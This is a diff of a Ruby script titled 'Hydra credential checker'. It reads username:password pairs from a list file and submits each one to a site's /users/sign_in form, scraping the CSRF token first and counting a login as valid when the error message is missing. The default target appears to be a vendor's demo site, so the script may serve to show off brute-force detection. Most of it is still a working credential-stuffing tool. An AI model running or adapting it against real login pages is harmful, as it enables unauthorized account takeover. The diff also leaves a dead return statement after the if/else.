@@ -1,28 +1,55 @@
 #!/usr/bin/env ruby
 
+require 'net/http'
+require 'uri'
+
+begin
 require 'colorize'
+rescue LoadError
+  $stderr.puts "Cannot load library `colorize`, please run:"
+  $stderr.puts "    $ gem install colorize"
+  $stderr.puts "or"
+  $stderr.puts "    $ sudo gem install colorize"
+  exit 1
+end
+
+def get_form_result(host, user, password)
+
+    http = Net::HTTP.new(host, 80)
+
+    path = "/users/sign_in"
+    req = Net::HTTP::Get.new path
+    res = http.request(req)
+    pat = "authenticity_token\" value=\""
+    body = res.body
+    token_idx = body.index(pat)
+    body[token_idx..-1] =~ /value="([^"]+)"/
+    token = $1
+    cookie = res['set-cookie']
+
+    path = '/users/sign_in'
+    form_data = {
+      'user[email]' => user,
+      'user[password]' => password,
+      'authenticity_token' => token,
+    }
+
+    req = Net::HTTP::Post.new(path)
+    req['cookie'] = cookie
+    req.set_form_data(form_data)
+    res = http.request(req)
+    return res.code, res.body
+end
 
 def is_login_valid(host, user, password)
-  # create Mechanize instance
-  Mechanize.start do |agent|
 
-    url = "#{host}/users/sign_in"
+  code, body = get_form_result(host, user, password)
 
-    login_form = agent.get(url).form_with(id: 'new_user')
-    login_form.field_with(id: 'user_email').value = user
-    login_form.field_with(id: 'user_password').value = password
-
-    # submit login form
-    res = agent.submit(login_form, login_form.buttons.first)
-    alert = res.at_css('.alert.alert-danger.alert-dismissable')
-    # puts alert.text
-    if alert.text.include?("Invalid email or password")
-      return {status: 403}
-    else
-      return {status: 200}
-    end
+  if body.include?("Invalid email or password")
+    return {status: 403}
+  else
+    return {status: 200}
   end
-rescue Mechanize::ResponseCodeError
   return {status: 500}
 end
 
@@ -39,8 +66,6 @@ default_bf = File.join(File.dirname($0), '..', 'bflist.txt')
 file = ARGV[0] || default_bf
 to = ARGV[1] || 'https://disrupt.sqreen.io/'
 
-require 'uri'
-
 if URI.parse(to)
   uri = URI.parse(to)
   unless uri.kind_of?(URI::HTTP) or uri.kind_of?(URI::HTTPS)
@@ -54,10 +79,10 @@ if not File.exist?(file) then
   exit(-1)
 end
 
-require 'mechanize'
-
 puts
 puts "Hydra credential checker".colorize(:color => :white, :background => :red)
+puts
+puts to
 puts
 
 for line in File.readlines(file) do
@@ -66,7 +91,7 @@ for line in File.readlines(file) do
   $stdout.write "trying #{user}:#{password}... "
   $stdout.flush
   
-  res = is_login_valid(to, user, password)
+  res = is_login_valid(uri.host, user, password)
 
   case res[:status]
   when 200
